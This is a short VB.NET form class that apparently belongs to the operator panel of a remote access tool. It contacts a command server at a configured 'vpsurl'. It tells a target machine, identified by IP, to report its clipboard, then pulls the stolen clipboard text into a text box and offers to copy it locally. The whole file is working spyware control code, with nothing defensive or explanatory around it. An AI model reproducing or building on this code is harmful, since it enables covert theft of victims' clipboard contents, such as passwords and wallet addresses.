Imports System.Net

Public Class GetClipboard
    Public targetIp As String
    Private Sub GetClipboard_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Get Clipboard @" & targetIp
        Dim client As New WebClient
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=getclipboard")
        Threading.Thread.Sleep(3000)
        TextBox1.Text = client.DownloadString(My.Settings.vpsurl & "clients.php?action=getclipboard&target=" & targetIp)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim client As New WebClient
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=getclipboard")
        Threading.Thread.Sleep(3000)
        TextBox1.Text = client.DownloadString(My.Settings.vpsurl & "clients.php?action=getclipboard&target=" & targetIp)

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Clipboard.SetText(TextBox1.Text)
    End Sub
End Class